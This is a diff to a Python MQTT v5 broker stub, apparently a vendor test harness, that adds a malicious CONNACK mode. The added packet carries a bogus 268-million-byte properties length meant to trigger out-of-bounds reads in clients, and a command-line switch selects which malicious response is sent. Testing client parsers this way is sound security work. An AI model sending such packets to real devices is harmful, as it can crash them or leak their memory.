@@ -1,8 +1,11 @@
 #!/usr/bin/env python3
+# SPDX-FileCopyrightText: 2026 Espressif Systems (Shanghai) CO LTD
+# SPDX-License-Identifier: Unlicense OR CC0-1.0
 """
 Minimal MQTT v5 broker stub.
 
-Supports only CONNECT and replies with a basic CONNACK.
+Supports only CONNECT and replies with a basic CONNACK, or a malicious
+CONNACK when --attack=conack/connack is enabled.
 All other packets are read and ignored to keep the TCP session open.
 """
 
@@ -12,8 +15,6 @@ import argparse
 import logging
 import socket
 import socketserver
-from typing import Optional
-
 
 PACKET_TYPES = {
     1: "CONNECT",
@@ -82,6 +83,25 @@ def build_connack(session_present: int = 0, reason_code: int = 0) -> bytes:
     return bytes([0x20]) + encode_varint(len(payload)) + payload
 
 
+def build_malicious_connack(
+    property_id: int = 0x12,
+    leak_len: int = 256,
+    padding_len: int = 0,
+) -> bytes:
+    # MQTT v5 CONNACK with a bogus properties length varint to trigger OOB reads.
+    if not (0 <= property_id <= 0xFF):
+        raise ValueError("property_id must fit in one byte")
+    if not (0 <= leak_len <= 0xFFFF):
+        raise ValueError("leak_len must fit in two bytes")
+    if padding_len < 0:
+        raise ValueError("padding_len must be non-negative")
+
+    prop_len_field = bytes([0xFF, 0xFF, 0xFF, 0x7F])  # 268,435,455
+    property_bytes = bytes([property_id]) + leak_len.to_bytes(2, "big")
+    payload = bytes([0x00, 0x00]) + prop_len_field + property_bytes + (b"A" * padding_len)
+    return bytes([0x20]) + encode_varint(len(payload)) + payload
+
+
 def build_suback(packet_id: int, reason_code: int = 0) -> bytes:
     # MQTT v5 SUBACK: [0x90][remaining_len][packet_id][props_len=0][reason]
     payload = packet_id.to_bytes(2, "big") + bytes([0x00, reason_code & 0xFF])
@@ -129,6 +149,8 @@ def build_malicious_publish(topic: str = "sensor/data") -> bytes:
 
 
 class MQTTStubHandler(socketserver.BaseRequestHandler):
+    attack_mode = "publish"
+
     def handle(self) -> None:
         sock: socket.socket = self.request
         peer = f"{self.client_address[0]}:{self.client_address[1]}"
@@ -167,9 +189,14 @@ class MQTTStubHandler(socketserver.BaseRequestHandler):
             )
 
             if packet_type == 1:  # CONNECT
-                connack = build_connack()
-                sock.sendall(connack)
-                logging.info("tx CONNACK to %s", peer)
+                if self.attack_mode in ("conack", "connack"):
+                    connack = build_malicious_connack()
+                    sock.sendall(connack)
+                    logging.info("tx malicious CONNACK to %s (attack=%s)", peer, self.attack_mode)
+                else:
+                    connack = build_connack()
+                    sock.sendall(connack)
+                    logging.info("tx CONNACK to %s", peer)
             elif packet_type == 8:  # SUBSCRIBE
                 if len(payload) < 2:
                     raise ValueError("malformed SUBSCRIBE (no packet id)")
@@ -177,9 +204,10 @@ class MQTTStubHandler(socketserver.BaseRequestHandler):
                 suback = build_suback(packet_id)
                 sock.sendall(suback)
                 logging.info("tx SUBACK to %s (packet_id=%d)", peer, packet_id)
-                malicious = build_malicious_publish()
-                sock.sendall(malicious)
-                logging.info("tx malicious PUBLISH to %s", peer)
+                if self.attack_mode == "publish":
+                    malicious = build_malicious_publish()
+                    sock.sendall(malicious)
+                    logging.info("tx malicious PUBLISH to %s", peer)
             # For now, ignore all other packet types and keep the TCP session open.
 
 
@@ -191,14 +219,21 @@ class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Minimal MQTT v5 broker stub")
     parser.add_argument("--host", default="0.0.0.0", help="bind host")
-    parser.add_argument("--port", default=1884, type=int, help="bind port")
+    parser.add_argument("--port", default=1883, type=int, help="bind port")
     parser.add_argument("--log-level", default="INFO", help="logging level")
+    parser.add_argument(
+        "--attack",
+        default="publish",
+        choices=("none", "publish", "conack", "connack"),
+        help="malicious response type",
+    )
     return parser.parse_args()
 
 
 def main() -> None:
     args = parse_args()
     logging.basicConfig(level=args.log_level.upper(), format="%(asctime)s %(levelname)s %(message)s")
+    MQTTStubHandler.attack_mode = args.attack
     with ThreadingTCPServer((args.host, args.port), MQTTStubHandler) as server:
         logging.info("MQTT v5 stub listening on %s:%d", args.host, args.port)
         try:
